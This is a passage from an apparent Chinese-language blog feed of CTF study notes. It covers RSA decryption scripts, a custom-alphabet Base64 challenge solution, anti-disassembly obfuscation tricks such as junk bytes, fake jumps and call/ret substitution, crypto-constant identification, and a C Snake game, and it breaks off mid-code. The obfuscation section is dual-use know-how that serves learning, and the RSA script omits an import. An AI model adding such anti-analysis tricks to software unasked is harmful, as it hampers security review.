id="求解步骤">求解步骤</h2><p>选择贪心策略—以什么标准做出选择</p><p>局部最优解—根据贪心策略一步步地得到局部最优解</p><p>全局最优解—合并所有局部最优解—&gt;得到原问题规模(?)的全局最优解</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA</title>
      <link href="/2023-09-17-abcb05c55138/"/>
      <url>/2023-09-17-abcb05c55138/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p>RSA是目前使用最广泛的公钥密码体制之一。它是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。<br>RSA算法的安全性基于RSA问题的困难性，也就是基于<code>大整数因子分解</code>的困难性上。但是RSA问题不会比因子分解问题更加困难，也就是说，在没有解决因子分解问题的情况下可能解决RSA问题，因此RSA算法并不是完全基于大整数因子分解的困难性上的。</p><p>注:RSA的相关证明涉及到中国剩余定理的利用</p><h1 id="算法描述">算法描述</h1><h2 id="rsa产生公私钥对">RSA产生公私钥对</h2><p>1.选取两个大素数 <code>p,q</code>,为了最大的安全性,p,q的位数相等</p><p>2.计算乘积 <code>n=p*q</code></p><p>3.随机取加密密钥 <code>e</code>,使得e和(p-1)(q-1)互素,然后使用欧几里得算法计算解密密钥<code>d</code></p><p>​一般情况下 <code>e</code> 取 <code>65537</code></p><p>​即有公式 <code>d = e^-1 mod (p-1)(q-1)</code></p><p>注意:</p><p>d和n也互素,至此,<code>e</code>和<code>n</code>为公钥,<code>d</code>为私钥</p><p>实际应用中，<code>e</code> 常常选择65537 (?)</p><h2 id="rsa的加解密算法">RSA的加解密算法</h2><p>设有明文<code>m</code>,密文为<code>c</code>,其中<code>0&lt;=m&lt;n,0&lt;=c&lt;n</code></p><p>则加密算法为:</p><p>​<code>c = m^e mod n</code></p><p>解密算法为:</p><p>​<code>m = c^d mod n</code></p><h1 id="rsa对明文的加解密的过程">RSA对明文的加解密的过程</h1><p>1.首先对于明文<code>M</code>,要对其进行比特串分组,确保每个分组<code>m</code>的十进制数都小于n(即<code>0&lt;=m&lt;n</code>)</p><p>2.然后对每个分组进行加密,整合为密文<code>C</code></p><p>3.对与密文<code>C</code>同理分组为<code>c</code>,有<code>0&lt;=c&lt;n</code></p><p>4.对其进行解密,最终整合为明文<code>M</code></p><h1 id="加解密脚本">加解密脚本</h1><p>CTF中,往往只会给出n,不可能直接给你p和q,当n较小时,我们使用<code>大数分解</code>在线网站等工具可以直接分解出p和q,此时加密即被破解.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知公私钥</span></span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">6376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = input(&#x27;请输入密文&#x27;)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  <span class="comment"># 对n取欧拉函数,p,q均为素数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)  <span class="comment"># 即e*d mod phi_n = 1 (求逆元)</span></span><br><span class="line">m = gmpy2.powmod(c, d, n)  <span class="comment"># 即m = c^d mod n (求大整数c的d次幂模n取余)</span></span><br><span class="line"><span class="comment"># print(m)  # 求得的明文</span></span><br><span class="line">flag = <span class="built_in">str</span>(<span class="built_in">hex</span>(m))[<span class="number">2</span>:]</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(flag).decode())</span><br><span class="line"><span class="comment"># print(binascii.unhexlify(flag))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果已知公私钥</span></span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = input(&#x27;请输入明文&#x27;)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  <span class="comment"># 对n取欧拉函数,p,q均为素数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)  <span class="comment"># 即e*d mod phi_n = 1 (求逆元)</span></span><br><span class="line">c = gmpy2.powmod(m, e, n)  <span class="comment"># 即c = m^e mod n (求大整数m的e次幂模n取余)</span></span><br><span class="line"><span class="built_in">print</span>(c)  <span class="comment"># 求得的密文</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="常用网站">常用网站</h1><p>解析公钥文件: <a href="http://tool.chacuo.net/cryptrsakeyparse">http://tool.chacuo.net/cryptrsakeyparse</a></p><p>进制转换: <a href="http://www.hiencode.com/jinzhi.html">http://www.hiencode.com/jinzhi.html</a></p><p>n分解为p,q: <a href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a>?</p>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Base64</title>
      <link href="/2023-09-17-18510efe0389/"/>
      <url>/2023-09-17-18510efe0389/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p>(见https://blog.csdn.net/local_752/article/details/121970823)</p><p>Base64是一种用64个字符表示所有二进制数据的编码方式，通过将二进制数据每6位一组的方式重新组织，刚好可以使用0~9的数字、大小写字母以及“+”和“/”总共64个字符表示从<code>000000</code>到<code>111111</code>的64种状态</p><p>它实际上是一种“二进制到文本”的编码方法</p><p>Base64是一种用64个字符(这64个字符中包括大小写字母、数字、＋和／，还有用来补缺的特殊字符=)来表示任意二进制数据的方法。它是一种编码方式，而非加密方式。它通过将二进制数据转变为64个“可打印字符”，完成了数据在HTTP协议上的传输。通过将二进制数据每6位一组的方式重新组织，刚好可以使用0~9的数字、大小写字母以及“+”和“/”总共64个字符表示从<code>000000</code>到<code>111111</code>的64种状态</p><p>注意：由于base64编码用了8位字符来表示信息中的6个位，所以base64编码字符串大约比原始值扩大了33%。</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230917180421686.png" alt="image-20230917180421686"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230917180421686.png" alt=""></p><h1 id="变表base64">变表Base64</h1><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">original_title</span>():</span><br><span class="line">    <span class="comment"># 原来的题目</span></span><br><span class="line">    str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">    string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;welcome to moectf\ninput your flag and I wiil check it:&#x27;</span>)</span><br><span class="line">    enc_flag = base64.b64encode(flag.encode()).decode()</span><br><span class="line">    enc_flag = enc_flag.translate(<span class="built_in">str</span>.maketrans(string2, string1))</span><br><span class="line">    <span class="keyword">if</span> enc_flag == str1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;good job!!!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;something wrong???&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>():</span><br><span class="line">    <span class="comment"># 方法1</span></span><br><span class="line">    str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">    string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">    convert_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string1)):</span><br><span class="line">        ch1 = string1[i]</span><br><span class="line">        ch2 = string2[i]</span><br><span class="line">        convert_dict[ch1] = ch2</span><br><span class="line"></span><br><span class="line">    str2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> convert_dict.keys():</span><br><span class="line">            str2 += i</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        j = convert_dict[i]</span><br><span class="line">        str2 += j</span><br><span class="line">    flag = base64.b64decode(str2.encode()).decode()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt2</span>():</span><br><span class="line">    <span class="comment"># 方法2</span></span><br><span class="line">    str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">    string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    flag = base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string2, string1)))</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt1()</span></span><br><span class="line">decrypt2()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码保护和混淆</title>
      <link href="/2023-09-15-d5932dc94d91/"/>
      <url>/2023-09-15-d5932dc94d91/</url>
      
        <content type="html"><![CDATA[<h1 id="抵御静态分析">抵御静态分析</h1><p>对于二进制程序分析,工具都要先进行反汇编,所以要进行抵御,可以对汇编进行特殊处理来干扰工具的分析</p><h2 id="花指令">花指令</h2><h3 id="函数头处增加pushfd-popfd和nop指令">函数头处增加pushfd,popfd和nop指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">;常规的函数头</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br><span class="line"></span><br><span class="line">;加上花指令后</span><br><span class="line">push ebp</span><br><span class="line">pushfd</span><br><span class="line">add esp,0xd</span><br><span class="line">nop</span><br><span class="line">sub esp 0xd</span><br><span class="line">popfd</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br><span class="line"></span><br><span class="line">;pushfd和popfd等指令会混淆逆向工具的栈指针解析</span><br></pre></td></tr></table></figure><h3 id="插入脏字节并设置跳转">插入脏字节并设置跳转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">jmp addr1 ;跳转到下面以保持正常的运行</span><br><span class="line">db 0xe8 ;脏字节,并且这个0xe8是call指令的起始字节,会让反汇编器认为这里是一条call指令</span><br><span class="line">addr1:</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br></pre></td></tr></table></figure><h3 id="条件跳转来干扰递归下降反汇编器">条件跳转来干扰递归下降反汇编器</h3><p>递归下降反汇编器虽然部分模拟了程序执行的控制流过程,但是并不是真正的运行,不能获取所有的信息,</p><p>利用这点插入条件跳转来让其反汇编所有的分支,这样就会导致0xe8被解析为指令,导致错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">jz addr1</span><br><span class="line">jnz addr1 ;实际上是成为了无条件跳转</span><br><span class="line">db 0xe8</span><br><span class="line">addr1:</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br></pre></td></tr></table></figure><p>例题见<a href="../%E9%80%86%E5%90%91%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93">逆向做题总结</a></p><h3 id="同时将代码打乱顺序">同时将代码打乱顺序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">jz addr3</span><br><span class="line">jnz addr3 ;实际上是成为了无条件跳转</span><br><span class="line">db 0xe8</span><br><span class="line">addr3:</span><br><span class="line">sub esp,0x100</span><br><span class="line">...</span><br><span class="line">addr2:</span><br><span class="line">mov ebp,esp</span><br><span class="line">jmp addr3</span><br></pre></td></tr></table></figure><h3 id="指令替换">指令替换</h3><p>将一些指令替换为另一组相同或相似效果的指令来混淆,虽然程序效果没有变化,但是特殊的指令会让反汇编器出现错误</p><p>例如call,ret指令会让反汇编器解析出的函数地址范围和调用关系出现错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;call指令</span><br><span class="line">call addr</span><br><span class="line">;可替换为</span><br><span class="line">push addr</span><br><span class="line">ret</span><br><span class="line">;ret 进一步替换为(前提是ecx没有在使用)</span><br><span class="line">push ecx</span><br><span class="line">mov ecx,[esp+4]</span><br><span class="line">add esp,8</span><br><span class="line">jmp ecx</span><br></pre></td></tr></table></figure><h3 id="代码自修改-smc">代码自修改(SMC)</h3><p>SMC技术会对程序特定部分在运行时进行特定的处理,并被使用函数指针来作为代码直接调用</p><p>常见于壳类程序中,静态分析时IDA等工具会将处理前的部分解析为数据,导致错误</p><h2 id="加密">加密</h2><p>加密壳程序分为<code>数据加密,代码加密,算法加密</code></p><p>数据加密一般是在合适的时机对程序中已有的数据进行即时的解密</p><p>代码加密同理,例如SMC技术</p><p>算法加密偏重算法的混淆,模糊与隐藏,例如VM虚拟机保护</p><h1 id="反调试">反调试</h1>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见算法识别</title>
      <link href="/2023-09-14-4680fd9332b0/"/>
      <url>/2023-09-14-4680fd9332b0/</url>
      
        <content type="html"><![CDATA[<h1 id="特征值识别">特征值识别</h1><p>许多常见算法会使用一些常量,如AES,DES等,为了提高效率,常常被硬编码在程序中,所以可以通过识别这些常量来推测程序是否使用了该算法.</p><p>例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/2183824-20210712212520283-1123075736.png" alt="img"></p><p>IDA中的FindCrypt插件,PEiD的KANAL可以查找特征值</p><h2 id="特征运算识别">特征运算识别</h2><p>特定的算法会有与之对应的运算,特征值不足以识别的时候,可以尝试分析程序中使用了那些特征运算,来进行算法的识别</p><p>例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/2183824-20210712215155442-1406369467.png" alt="img"></p><h1 id="第三方库识别">第三方库识别</h1><h2 id="字符串识别">字符串识别</h2><p>许多第三方库都会将自己的版权信息,使用到的字符串(报错信息等)以字符串写入库,静态编译时,可以在二进制程序中找到这些信息,即可判断使用了哪些第三方库</p><h2 id="函数签名识别">函数签名识别</h2><p>库对应一系列函数,可通过特定的函数签名来识别具体的函数,可以使用IDA的签名识别功能来进行查找,同时若IDA没有预置需要识别的库函数签名,则可以上网查找需要的函数签名库进行导入,或者使用IDA SDK中提供的FLAIR工具,根据已有的静态库文件来生成一份签名</p><h2 id="二进制比对识别">二进制比对识别</h2><p>可以使用BinDiff工具来对二进制程序A(要分析的程序)和二进制程序B(自行找到的一个包含特定信息的程序)进行比较分析.</p><p>如果已知了A使用了某特定库,但是因为环境不同等原因不能完全匹配,这时可以找另外一个已经使用了该库的程序进行比对,来查看相似度,相似度达0.99的大概率是相同函数</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言贪吃蛇</title>
      <link href="/2023-09-08-79dbc5fa8424/"/>
      <url>/2023-09-08-79dbc5fa8424/</url>
      
        <content type="html"><![CDATA[<h1 id="游戏说明">游戏说明</h1><p>本代码实现了Windows下(使用了Win API)基于c语言的控制台运行的贪吃蛇游戏.</p><p>代码开源至:<a href="https://github.com/gngtwhh/snake">https://github.com/gngtwhh/snake</a></p><p>代码行数: 537行</p><p>文件包括:<br>game.c 游戏运行逻辑支持<br>main.c 主函数控制<br>menu.c 菜单选择控制<br>snake.h 声明头文件<br>system.c 系统支持相关</p><p>细节描述:<br>实现菜单选择,游戏基本元素,自定义游戏设置,完善用户交互,处理用户错误输入</p><h1 id="实现效果">实现效果</h1><h2 id="主界面">主界面</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110606510.png" alt="image-20230908110606510"></p><h2 id="自定义">自定义</h2><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110640008.png" alt="image-20230908110640008" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110652950.png" alt="image-20230908110652950" style="zoom:33%;" /><h2 id="游戏开始">游戏开始</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110721287.png" alt="image-20230908110721287"></p><h2 id="结算界面">结算界面</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110739259.png" alt="image-20230908110739259"></p><h1 id="代码详解">代码详解</h1><p>注:代码中一些函数进行了简化和适当的省略,主要为了体现代码的逻辑</p><h2 id="游戏数据结构-game-c">游戏数据结构—game.c</h2><p>使用一个双向链表来存储蛇,使用一个包含一个坐标对的结构体来存储苹果的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// 以下在snake.h头文件中</span></span><br><span class="line"><span class="comment">#define bool int // 纯c语言,没有bool类型,需要宏定义bool类型</span></span><br><span class="line"><span class="comment">#define false 0 // 将true和false作为对应到1和0的宏</span></span><br><span class="line"><span class="comment">#define true 1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//游戏数据</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">snake</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snake</span> *<span class="title">prior</span>, *<span class="title">next</span>;</span></span><br><span class="line">&#125; snake;<span class="comment">//蛇身体的一个结点的类型</span></span><br><span class="line">snake *head, *tail;<span class="comment">//指向蛇头和蛇尾结点的指针</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">APPLE</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">&#125; apple;<span class="comment">//苹果的坐标数据</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> score, pre_x, pre_y, wait = <span class="number">500</span>;<span class="comment">//得分;前一个x,y坐标;等待时长(和游戏难度有关---改变蛇移动的速度)</span></span><br><span class="line"><span class="type">int</span> HEIGHT = <span class="number">30</span>;<span class="comment">//地图高度</span></span><br><span class="line"><span class="type">int</span> WIDTH = <span class="number">30</span>;<span class="comment">//地图宽度</span></span><br><span class="line"><span class="type">int</span> curSnakeLen = <span class="number">0</span>;<span class="comment">//当前的蛇身长度</span></span><br><span class="line"><span class="type">int</span> maxSnakeLen = <span class="number">0</span>;<span class="comment">//地图能容纳的最大蛇身长度,达到这个长度意味着游戏胜利</span></span><br></pre></td></tr></table></figure><h2 id="游戏控制-main-c">游戏控制—main.c</h2><p>头文件包含</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span> <span class="comment">// Console Input/Output,定义了通过控制台进行数据输入和数据输出的函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snake.h&quot;</span> <span class="comment">// 包含了所有的函数声明,和为了与c++兼容设置的bool宏</span></span></span><br></pre></td></tr></table></figure><p>代码逻辑</p><p>使用一个while(1)循环来重复开始游戏,从而实现一局游戏结束后可以回到主菜单准备下一次游戏</p><p>在循环中使用一个char c;配合_getch()来进行菜单选择,同时对于错误输出专门使用一个函数来处理</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">printMenu();<span class="comment">//第一次进入循环前先初始化一次菜单</span></span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;<span class="comment">//控制主循环</span></span><br><span class="line">gotoxy(<span class="number">37</span>, <span class="number">17</span>);<span class="comment">//定位到输入栏</span></span><br><span class="line">c = _getch();<span class="comment">//vs2022要求将getch()更换为_getch()---标准c编译器换回getch()(?)</span></span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">initGame();<span class="comment">//游戏数据初始化</span></span><br><span class="line">start();<span class="comment">//正式开始一局游戏</span></span><br><span class="line">            destoryGameData();<span class="comment">//清除游戏数据,释放空间</span></span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);<span class="comment">//游戏结束清屏</span></span><br><span class="line">printMenu();<span class="comment">//重新打印菜单</span></span><br><span class="line">            </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">color(<span class="number">7</span>);<span class="comment">//将颜色设置回白色</span></span><br><span class="line">gotoxy(<span class="number">0</span>, <span class="number">18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;游戏结束!\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">//跳出循环,结束游戏</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> wrongInput();<span class="comment">//输入非法,打印错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="菜单选择-menu-c">菜单选择—menu.c</h2><p>包含了菜单界面的图形打印,用户错误输入处理,以及游戏初始化的调用接口</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">printMenu</span><span class="params">()</span>; <span class="comment">// 打印菜单,其中利用了gotoxy()函数进行控制台光标的跳转</span></span><br><span class="line"><span 